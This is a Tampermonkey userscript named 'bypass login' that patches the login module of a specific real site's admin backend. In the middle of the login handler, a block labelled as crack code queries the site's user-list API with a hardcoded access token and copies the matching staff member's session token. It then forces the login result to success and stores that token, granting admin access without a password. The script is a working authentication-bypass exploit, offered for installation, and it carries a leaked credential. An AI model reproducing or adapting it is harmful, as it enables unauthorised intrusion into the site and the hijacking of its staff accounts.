// ==UserScript==
// @name         绕过登录
// @namespace    http://tampermonkey.net/
// @version      6
// @description  try to take over the world!
// @author       JHF
// @match        https://www.xffzgg.com/background.html
// @grant        none
// @require      https://ajax.aspnetcdn.com/ajax/jQuery/jquery-2.0.0.min.js
// @downloadURL https://update.greasyfork.org/scripts/422034/%E7%BB%95%E8%BF%87%E7%99%BB%E5%BD%95.user.js
// @updateURL https://update.greasyfork.org/scripts/422034/%E7%BB%95%E8%BF%87%E7%99%BB%E5%BD%95.meta.js
// ==/UserScript==
(function() {
	webpackJsonp([31], {
		1075: function(e, o) {
			e.exports = {
				render: function() {
					var e = this,
						o = e.$createElement,
						r = e._self._c || o;
					return r("div", {
						staticClass: "login-wrap"
					}, [r("div", {
						staticClass: "ms-title"
					}, [e._v("后台管理系统")]), e._v(" "), r("div", {
						staticClass: "ms-login"
					}, [r("el-form", {
						ref: "ruleForm",
						staticClass: "demo-ruleForm",
						attrs: {
							model: e.ruleForm,
							rules: e.rules,
							"label-width": "0px"
						}
					}, [r("el-form-item", {
						attrs: {
							prop: "username"
						}
					}, [r("el-input", {
						attrs: {
							placeholder: "请输入用户名"
						},
						model: {
							value: e.ruleForm.username,
							callback: function(o) {
								e.$set(e.ruleForm, "username", o)
							},
							expression: "ruleForm.username"
						}
					})], 1), e._v(" "), r("el-form-item", {
						attrs: {
							prop: "password"
						}
					}, [r("el-input", {
						attrs: {
							type: "password",
							placeholder: "请输入密码"
						},
						nativeOn: {
							keyup: function(o) {
								if (!("button" in o) && e._k(o.keyCode, "enter", 13, o.key)) return null;
								e.submitForm("ruleForm")
							}
						},
						model: {
							value: e.ruleForm.password,
							callback: function(o) {
								e.$set(e.ruleForm, "password", o)
							},
							expression: "ruleForm.password"
						}
					})], 1), e._v(" "), r("div", {
						staticClass: "login-btn"
					}, [r("el-button", {
						attrs: {
							type: "primary",
							loading: e.loading
						},
						on: {
							click: function(o) {
								e.submitForm("ruleForm")
							}
						}
					}, [e._v("登录")])], 1), e._v(" "), r("p", {
						staticStyle: {
							"font-size": "12px",
							"line-height": "30px",
							color: "#999"
						}
					}, [e._v("Tips : 请联系管理员开通账号。")])], 1)], 1)])
				},
				staticRenderFns: []
			}
		},
		1139: function(e, o, r) {
			var t = r(737);
			"string" == typeof t && (t = [
				[e.i, t, ""]
			]), t.locals && (e.exports = t.locals);
			r(200)("75b952e6", t, !0)
		},
		531: function(e, o, r) {
			r(1139);
			var t = r(201)(r(609), r(1075), "data-v-0f63fe6d", null);
			e.exports = t.exports
		},
		564: function(e, o, r) {
			e.exports = {
				default: r(565),
				__esModule: !0
			}
		},
		565: function(e, o, r) {
			var t = r(65),
				a = t.JSON || (t.JSON = {
					stringify: JSON.stringify
				});
			e.exports = function(e) {
				return a.stringify.apply(a, arguments)
			}
		},
		609: function(e, o, r) {
			"use strict";
			Object.defineProperty(o, "__esModule", {
				value: !0
			});
			var t = r(564),
				a = r.n(t);
			o.default = {
				data: function() {
					return {
						loading: !1,
						ruleForm: {
							username: "",
							password: ""
						},
						rules: {
							username: [{
								required: !0,
								message: "请输入用户名",
								trigger: "blur"
							}],
							password: [{
								required: !0,
								message: "请输入密码",
								trigger: "blur"
							}]
						}
					}
				},
				methods: {
					submitForm: function(e) {
						var o = this,
							r = this;
						r.$refs[e].validate(function(e) {
							if (!e) return !1;
							r.loading = !0;
							var t = {
								name: r.ruleForm.username,
								password: r.ruleForm.password
							};
							o.ajax("/user/login", a()(t), function(e) {
								//破解代码--开始
								var user = $(".el-input__inner").val();
								var manager_user_id = "";
								var manager_user_name = "";
								var token = "";
								var role_id = "";
								$.ajax({
									url: "api/manage/user/getList?token=3E1443ABDDCE28D99C0ACB523B7215CE&user_id=28&user_name=zgg&args=",
									type: "GET",
									dataType: "json",
									async: false,
									success: function(result) {
										//var json = JSON.parse(result);
										for (var i = 0; i < result.list.length; i++) {
											var item = result.list[i];
											if (user == item.manager_user_name) {
												manager_user_id = item.manager_user_id;
												manager_user_name = item.manager_user_name;
												token = item.token;
												e.role_id = item.role_id;
												break;
											}
										}
									}
								});
								e.user_id = manager_user_id;
								e.user_name = manager_user_name;
								e.token = token;
								e.role_id = "";
								e.success = true;
								//破解代码--结束
								r.loading = !1, console.log(e), e.success ? (localStorage.setItem("user_id", e.user_id), localStorage.setItem("user_name", e.user_name), localStorage.setItem("token", e.token), r.common.user_info.user_id = e.user_id, r.common.user_info.user_name = e.user_name, r.common.user_info.token = e.token, r.ajax("/user/get_role", a()(t), function(e) {
									if (console.log(e), e.success) {
										r.$router.push("/workbench");
										var o = JSON.parse(e.role.rights);
										if (void 0 == o.MyCustomer) {
											var t = {
												List: !1,
												Lock: !1,
												Add: !1,
												Del: !1,
												Edit: !1,
												Follow: !1,
												Bak1: !1,
												Bak2: !1,
												Bak3: !1,
												Bak4: !1,
												Bak5: !1,
												Bak6: !1
											};
											o.MyCustomer = t
										}
										if (void 0 == o.WorkFlow) {
											var s = {
												List: !1,
												Lock: !1,
												Add: !1,
												Del: !1,
												Edit: !1,
												Follow: !1,
												Bak1: !1,
												Bak2: !1,
												Bak3: !1,
												Bak4: !1,
												Bak5: !1,
												Bak6: !1
											};
											o.WorkFlow = s
										}
										if (void 0 == o.News) {
											var i = {
												List: !1,
												Lock: !1,
												Add: !1,
												Del: !1,
												Edit: !1,
												Follow: !1,
												Bak1: !1,
												Bak2: !1,
												Bak3: !1,
												Bak4: !1,
												Bak5: !1,
												Bak6: !1
											};
											o.News = i
										}
										if (void 0 == o.Message) {
											var n = {
												List: !1,
												Lock: !1,
												Add: !1,
												Del: !1,
												Edit: !1,
												Follow: !1,
												Bak1: !1,
												Bak2: !1,
												Bak3: !1,
												Bak4: !1,
												Bak5: !1,
												Bak6: !1
											};
											o.Message = n
										}
										if (void 0 == o.FeedBack) {
											var l = {
												List: !1,
												Lock: !1,
												Add: !1,
												Del: !1,
												Edit: !1,
												Follow: !1,
												Bak1: !1,
												Bak2: !1,
												Bak3: !1,
												Bak4: !1,
												Bak5: !1,
												Bak6: !1
											};
											o.FeedBack = l
										}
										localStorage.setItem("rights", a()(o))
									}
								}, !0)) : 202 == e.code ? r.$message.error("登陆失败,请检查账号和密码") : 203 == e.code ? r.$message.error("登陆失败,错误代码-" + e.code + "系统异常：" + e.msg) : 218 == e.code ? r.$message.error("登陆失败,IP不在白名单,请联系管理员添加") : r.$message.error("登陆失败,错误代码-" + e.code + "系统异常：" + e.msg)
							}, !0)
						})
					}
				}
			}
		},
		737: function(e, o, r) {
			o = e.exports = r(88)(!1), o.push([e.i, ".login-wrap[data-v-0f63fe6d]{position:relative;width:100%;height:100%}.ms-title[data-v-0f63fe6d]{position:absolute;top:50%;width:100%;margin-top:-230px;text-align:center;font-size:30px;color:#fff}.ms-login[data-v-0f63fe6d]{position:absolute;left:50%;top:50%;width:300px;height:160px;margin:-150px 0 0 -190px;padding:40px;border-radius:5px;background:#fff}.login-btn[data-v-0f63fe6d]{text-align:center}.login-btn button[data-v-0f63fe6d]{width:100%;height:36px}", ""])
		}
	});
})();
